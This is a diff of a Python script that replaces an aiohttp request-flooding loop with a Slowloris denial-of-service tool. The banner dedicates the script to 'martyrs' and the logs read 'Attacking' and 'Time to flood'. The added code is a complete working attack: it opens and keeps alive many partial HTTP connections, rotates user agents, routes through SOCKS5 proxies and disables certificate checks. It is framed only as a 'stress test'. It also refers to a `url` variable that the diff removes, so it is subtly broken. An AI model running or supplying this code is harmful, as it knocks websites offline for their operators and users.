@@ -16,14 +16,13 @@ else:  # Unix/Linux/Mac
     os.system("Clear")
 
 logo = """
-                                ÷÷                         ÷÷
-                                ÷÷                         ÷÷
-  ÷÷     ÷÷      ÷÷ ÷÷       ÷÷ ÷÷      ÷÷ ÷÷  ÷÷   ÷÷  ÷÷ ÷÷ ÷÷
-÷÷  ÷÷ ÷÷  ÷÷  ÷÷     ÷÷   ÷÷   ÷÷   ÷÷    ÷÷  ÷÷ ÷÷  ÷÷   ÷÷
-÷÷    ÷÷   ÷÷  ÷÷     ÷÷  ÷÷    ÷÷  ÷÷     ÷÷  ÷÷÷         ÷÷
-÷÷    ÷÷   ÷÷  ÷÷     ÷÷  ÷÷    ÷÷  ÷÷     ÷÷  ÷÷          ÷÷   ÷÷
-÷÷    ÷÷   ÷÷  ÷÷     ÷÷   ÷÷   ÷÷   ÷÷    ÷÷  ÷÷          ÷÷   ÷÷
-÷÷    ÷÷   ÷÷    ÷÷ ÷÷       ÷÷ ÷÷      ÷÷ ÷÷  ÷÷             ÷÷÷
+÷÷      ÷÷  ÷÷ ÷÷ ÷÷        ÷÷ ÷÷ 
+÷÷    ÷÷    ÷÷            ÷÷     ÷÷
+÷÷  ÷÷      ÷÷                   ÷÷
+÷÷ ÷÷       ÷÷ ÷÷ ÷÷           ÷÷
+÷÷  ÷÷      ÷÷               ÷÷
+÷÷    ÷÷    ÷÷             ÷÷
+÷÷      ÷÷  ÷÷            ÷÷ ÷÷ ÷÷ 
 _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—             
 _—"\033[32m              THIS SCRIPT IS A DEDICATION    
 _—"\033[33m         TO THE STABILIZATION OF THE MARTYRS
@@ -33,72 +32,225 @@ _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—
 """
 faded_text = fade.fire(logo)
 print(faded_text)
-socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-addr = (str(),int())
-ask = fade.pinkred("Enter the target IP/URL:")
-async def fire_and_forget(url, session, counter):
+parser = argparse.ArgumentParser(
+    description="Slowloris, low bandwidth stress test tool for websites"
+)
+parser.add_argument("host", nargs="?", help="Host to perform stress test on")
+parser.add_argument(
+    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
+)
+parser.add_argument(
+    "-s",
+    "--sockets",
+    default=150,
+    help="Number of sockets to use in the test",
+    type=int,
+)
+parser.add_argument(
+    "-v",
+    "--verbose",
+    dest="verbose",
+    action="store_true",
+    help="Increases logging",
+)
+parser.add_argument(
+    "-ua",
+    "--randuseragents",
+    dest="randuseragent",
+    action="store_true",
+    help="Randomizes user-agents with each request",
+)
+parser.add_argument(
+    "-x",
+    "--useproxy",
+    dest="useproxy",
+    action="store_true",
+    help="Use a SOCKS5 proxy for connecting",
+)
+parser.add_argument(
+    "--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host"
+)
+parser.add_argument(
+    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
+)
+parser.add_argument(
+    "--https",
+    dest="https",
+    action="store_true",
+    help="Use HTTPS for the requests",
+)
+parser.add_argument(
+    "--sleeptime",
+    dest="sleeptime",
+    default=15,
+    type=int,
+    help="Time to sleep between each header sent.",
+)
+parser.set_defaults(verbose=False)
+parser.set_defaults(randuseragent=False)
+parser.set_defaults(useproxy=False)
+parser.set_defaults(https=False)
+args = parser.parse_args()
+
+if len(sys.argv) <= 1:
+    parser.print_help()
+    sys.exit(1)
+
+if not args.host:
+    print("Host required!")
+    parser.print_help()
+    sys.exit(1)
+
+if args.useproxy:
+    # Tries to import to external "socks" library
+    # and monkey patches socket.socket to connect over
+    # the proxy by default
     try:
-        async with session.get(url) as response:
-            # You can add some minimal processing here if needed
-            pass
-        counter.increment()
-    except Exception as e:
-        print(f"Error: {e}")
+        import socks
 
-class RequestCounter:
-    def __init__(self):
-        self.count = 0
-        self.log_file_path = None
+        socks.setdefaultproxy(
+            socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port
+        )
+        socket.socket = socks.socksocket
+        logging.info("Using SOCKS5 proxy for connecting...")
+    except ImportError:
+        logging.error("Socks Proxy Library Not Available!")
+        sys.exit(1)
 
-    def increment(self):
-        self.count += 1
+logging.basicConfig(
+    format="[%(asctime)s] %(message)s",
+    datefmt="%d-%m-%Y %H:%M:%S",
+    level=logging.DEBUG if args.verbose else logging.INFO,
+)
 
-    def reset(self):
-        current_count = self.count
-        self.count = 0
-        return current_count
 
-def get_log_file_path(log_folder, base_name="requests_log"):
-    if not os.path.exists(log_folder):
-        os.makedirs(log_folder)
-    if not os.path.exists(os.path.join(log_folder, "requests_log-1.txt")):
-        return os.path.join(log_folder, "requests_log-1.txt")
-    
-    # If the file already exists, find the next available number
-    file_number = 1
-    while os.path.exists(os.path.join(log_folder, f"{base_name}-{file_number}.txt")):
-        file_number += 1
-    return os.path.join(log_folder, f"{base_name}-{file_number}.txt")
+def send_line(self, line):
+    line = f"{line}\r\n"
+    self.send(line.encode("utf-8"))
 
-async def write_requests_per_second(counter):
-    log_folder = "requests_log"
-    counter.log_file_path = get_log_file_path(log_folder)
 
-    while True:
-        await asyncio.sleep(1)
-        total_requests = counter.reset()
-        with open(counter.log_file_path, "w") as file:
-            file.write(f"Requests per second: {total_requests}\n")
+def send_header(self, name, value):
+    self.send_line(f"{name}: {value}")
 
-async def main():
-    file_path = 'request_website.txt'
 
-    try:
-        with open(file_path, 'r') as file:
-            url = file.read().strip()
-    except FileNotFoundError:
-        print(f"Error: File '{file_path}' not found.")
+if args.https:
+    logging.info("Importing ssl module")
+    import ssl
+
+    setattr(ssl.SSLSocket, "send_line", send_line)
+    setattr(ssl.SSLSocket, "send_header", send_header)
+
+list_of_sockets = []
+user_agents = [
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
+
+]
+
+setattr(socket.socket, "send_line", send_line)
+setattr(socket.socket, "send_header", send_header)
+
+
+def init_socket(ip: str):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(4)
+
+    if args.https:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        s = ctx.wrap_socket(s, server_hostname=args.host)
+
+    s.connect((ip, args.port))
+
+    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
+
+    ua = user_agents[0]
+    if args.randuseragent:
+        ua = random.choice(user_agents)
+
+    s.send_header("User-Agent", ua)
+    s.send_header("Accept-language", "en-US,en,q=0.5")
+    return s
+
+
+def slowloris_iteration():
+    logging.info("[✴️]  \033[93mTime to flood   \033[31m[\033[34mThe server\033[31m]  \033[32m" +url+ "\033[0m")
+    logging.info("[✴️]  \033[96mSocket count:   \033[35m[\033[32m%s\033[35m]\033[0m", len(list_of_sockets))
+
+    # Try to send a header line to each socket
+    for s in list(list_of_sockets):
+        try:
+            s.send_header("X-a", random.randint(1, 5000))
+        except socket.error:
+            list_of_sockets.remove(s)
+
+    # Some of the sockets may have been closed due to errors or timeouts.
+    # Re-create new sockets to replace them until we reach the desired number.
+
+    diff = args.sockets - len(list_of_sockets)
+    if diff <= 0:
         return
 
-    requests_per_iteration = 100  # Adjust the number of requests per loop iteration
-    counter = RequestCounter()
+    logging.info("Creating %s new sockets...", diff)
+    for _ in range(diff):
+        try:
+            s = init_socket(args.host)
+            if not s:
+                continue
+            list_of_sockets.append(s)
+        except socket.error as e:
+            logging.debug("Failed to create new socket: %s", e)
+            break
 
-    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
-        asyncio.create_task(write_requests_per_second(counter))
-        
-        while True:
-            tasks = [fire_and_forget(url, session, counter) for _ in range(requests_per_iteration)]
-            await asyncio.gather(*tasks)
 
-if __name__ == '__main__':
-    asyncio.run(main())
+def main():
+    ip = args.host
+    socket_count = args.sockets
+    logging.info("Attacking %s with %s sockets.", ip, socket_count)
+
+    logging.info("Creating sockets...")
+    for _ in range(socket_count):
+        try:
+            logging.debug("Creating socket nr %s", _)
+            s = init_socket(ip)
+        except socket.error as e:
+            logging.debug(e)
+            break
+        list_of_sockets.append(s)
+
+    while True:
+        try:
+            slowloris_iteration()
+        except (KeyboardInterrupt, SystemExit):
+            logging.info("Stopping Slowloris")
+            break
+        except Exception as e:
+            logging.debug("Error in Slowloris iteration: %s", e)
+        logging.debug("Sleeping for %d seconds", args.sleeptime)
+        time.sleep(args.sleeptime)
+
+
+if __name__ == "__main__":
+    main()
